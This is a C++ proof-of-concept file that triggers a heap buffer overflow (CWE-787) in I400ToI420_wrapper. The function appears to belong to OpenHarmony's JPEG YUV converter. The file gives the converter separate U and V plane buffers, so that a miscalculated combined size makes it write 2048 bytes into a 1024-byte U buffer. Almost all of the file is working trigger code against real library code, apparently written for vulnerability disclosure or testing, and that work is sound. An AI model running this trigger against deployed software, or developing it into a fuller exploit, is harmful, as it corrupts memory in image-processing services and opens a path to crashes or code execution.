/*
 * PoC: Heap Buffer Overflow in I400ToI420_wrapper via UVCOMSize miscalculation
 * CWE-787: Out-of-bounds Write
 *
 * Target-Compile: Links real jpeg_yuvdata_converter.cpp and yuv_helper.cpp
 * Trigger: I400ToI420_wrapper() with separate U/V plane allocations
 */

#include <cstdlib>
#include <cstring>
#include <cstdio>

#include "jpeg_yuvdata_converter.h"

using namespace OHOS::ImagePlugin;

int main() {
    const uint32_t WIDTH = 64;
    const uint32_t HEIGHT = 64;
    const uint32_t Y_STRIDE = WIDTH;
    const uint32_t UV_WIDTH = WIDTH / 2;   // 32
    const uint32_t UV_HEIGHT = HEIGHT / 2; // 32
    const size_t Y_SIZE = Y_STRIDE * HEIGHT;        // 4096
    const size_t UV_SIZE = UV_WIDTH * UV_HEIGHT;    // 1024 per plane

    printf("[*] PoC: I400ToI420 UV plane overflow (CWE-787)\n");
    printf("[*] Image: %ux%u grayscale -> I420\n", WIDTH, HEIGHT);
    printf("[*] U plane allocation: %zu bytes\n", UV_SIZE);
    printf("[*] UVCOMSize computed: %zu bytes (U+V combined)\n", UV_SIZE * 2);
    printf("[*] memset_s will write %zu bytes to %zu-byte U buffer\n", UV_SIZE * 2, UV_SIZE);

    // Source: grayscale image (only Y plane)
    uint8_t *srcY = (uint8_t *)malloc(Y_SIZE);
    if (!srcY) return 1;
    memset(srcY, 0x40, Y_SIZE);

    // Destination: I420 with SEPARATE U and V plane allocations
    uint8_t *destY = (uint8_t *)malloc(Y_SIZE);
    uint8_t *destU = (uint8_t *)malloc(UV_SIZE);  // Only 1024 bytes
    uint8_t *destV = (uint8_t *)malloc(UV_SIZE);  // Separate allocation
    if (!destY || !destU || !destV) return 1;
    memset(destY, 0, Y_SIZE);
    memset(destU, 0, UV_SIZE);
    memset(destV, 0, UV_SIZE);

    // Source YuvPlaneInfo (grayscale)
    YuvPlaneInfo src = {};
    src.imageWidth = WIDTH;
    src.imageHeight = HEIGHT;
    src.planes[YCOM] = srcY;
    src.strides[YCOM] = Y_STRIDE;
    src.planeWidth[YCOM] = WIDTH;
    src.planeHeight[YCOM] = HEIGHT;

    // Destination YuvPlaneInfo (I420 with separate U/V)
    YuvPlaneInfo dest = {};
    dest.imageWidth = WIDTH;
    dest.imageHeight = HEIGHT;
    dest.planes[YCOM] = destY;
    dest.planes[UCOM] = destU;
    dest.planes[VCOM] = destV;
    dest.strides[YCOM] = Y_STRIDE;
    dest.strides[UCOM] = UV_WIDTH;
    dest.strides[VCOM] = UV_WIDTH;
    dest.planeWidth[YCOM] = WIDTH;
    dest.planeWidth[UCOM] = UV_WIDTH;
    dest.planeWidth[VCOM] = UV_WIDTH;
    dest.planeHeight[YCOM] = HEIGHT;
    dest.planeHeight[UCOM] = UV_HEIGHT;
    dest.planeHeight[VCOM] = UV_HEIGHT;

    // Trigger: I400ToI420_wrapper with grayscale source
    // UVCOMSize = U_size + V_size = 2048, writes to 1024-byte U buffer
    int ret = I400ToI420_wrapper(src, dest);

    printf("[!] Return value: %d\n", ret);

    free(srcY);
    free(destY);
    free(destU);
    free(destV);
    return 0;
}
